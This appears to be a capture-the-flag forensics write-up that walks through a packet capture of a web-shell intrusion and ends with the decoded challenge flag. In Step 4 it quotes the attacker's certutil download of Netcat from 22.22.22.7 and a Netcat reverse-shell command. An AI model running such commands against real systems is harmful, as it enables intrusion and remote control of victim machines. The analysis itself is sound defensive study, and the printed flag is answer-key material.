<img width="698" height="673" alt="image" src="https://github.com/user-attachments/assets/9275035e-a2b4-42f7-bbb7-5003421bafbe" />

## Step 1 — Initial PCAP Analysis

I opened the `chase.pcapng` in **Wireshark**.

**Findings:**

- Source attacker: **22.22.22.7**
- Victim server: **22.22.22.5**
- Normal HTTP browsing first (`GET /`, `GET /welcome.png`).
- Then suspicious activity:
    - `POST /upload.aspx?operation=upload`
    - `GET /cmd.aspx`
    - `POST /cmd.aspx` with small payloads

**Suspicion:** File upload exploit → Webshell execution.

<img width="860" height="866" alt="image" src="https://github.com/user-attachments/assets/c5205f17-7022-4d65-a30e-1dde3831aaa1" />

<img width="1815" height="435" alt="image" src="https://github.com/user-attachments/assets/bb063168-b22c-4698-8cc1-6cf98f54e83d" />

### Initial Recon

- `GET /` and `GET /welcome.png` — attacker browses the site.
- `upload.aspx` is discovered — likely an upload endpoint.

### Exploitation Phase

- `POST /upload.aspx?operation=upload` — attacker uploads a file (1899 bytes).
- Response is `200 OK` — upload successful.

### Payload Execution

- `GET /cmd.aspx` — attacker accesses the uploaded web shell.
- `POST /cmd.aspx` — attacker sends commands via the shell.

### Tool Delivery

- `GET /nc64.exe` — attacker downloads Netcat from their own host (`22.22.22.7`).
- File size: 45272 bytes — confirms full binary transfer.

### 📬 Flag Retrieval

- `GET /JBKEE62NIFXF6ODMOUZV6NZTMFGV6URQMNMH2IBA.txt` — attacker retrieves a text file.

## Extract HTTP Objects

Used `tshark` to carve out HTTP-transferred files:

```bash
mkdir http-objects
tshark -r chase.pcapng --export-objects "http,http-objects"
ls -lh http-objects
```

Recovered files:

- `upload.aspx` (vulnerable page)
- `cmd.aspx` (attacker webshell)
- `nc64.exe` (Netcat binary)
- `JBKEE62NIFXF6ODMOUZV6NZTMFGV6URQMNMH2IBA.txt` (suspicious text file)

<img width="1783" height="500" alt="image" src="https://github.com/user-attachments/assets/57e1c307-ddf2-482e-865a-dc482629126b" />

## Analyze Webshell (`cmd.aspx`)

Content revealed a **simple ASPX command execution shell**:

<img width="1761" height="355" alt="image" src="https://github.com/user-attachments/assets/8c9b4125-aecd-4096-9695-da81514cb43f" />

## Step 4 — Reconstruct Attacker Commands

The POST payloads (`cmd(1).aspx`, `cmd(2).aspx`, `cmd(3).aspx`) showed:

1. **Download Netcat with certutil**
    
    ```
    /c certutil -urlcache -split -f http://22.22.22.7/nc64.exe c:\users\public\nc.exe
    ```
    
    → Confirmed by response: *“CertUtil: -URLCache command completed successfully.”*
    
2. **Execute reverse shell**
    
    ```
    /c c:\users\public\nc.exe 22.22.22.7 4444 -e cmd.exe
    ```
    

Attacker gained a **remote shell** on the victim.

<img width="1813" height="110" alt="image" src="https://github.com/user-attachments/assets/e72f8dfe-da46-4309-a405-ac7fde1f8d55" />

<img width="1806" height="125" alt="image" src="https://github.com/user-attachments/assets/1dabcedb-e391-46bf-ade6-f2c9242fc30f" />

## Step 5 — Check Exfiltration

File `JBKEE62NIFXF6ODMOUZV6NZTMFGV6URQMNMH2IBA.txt` contained:

<img width="1498" height="90" alt="image" src="https://github.com/user-attachments/assets/9ab6c3c6-aedc-450a-8438-9feab19c1c65" />

## Step 6 — Decode the Filename

Decoded with `base32`:

```bash
echo "JBKEE62NIFXF6ODMOUZV6NZTMFGV6URQMNMH2IBA" | base32 -d
```

<img width="1715" height="84" alt="image" src="https://github.com/user-attachments/assets/ba509171-5759-40cb-9e59-1f2286c13515" />

`HTB{MAn_8lu3_73aM_R0cX}`
there is our flag!
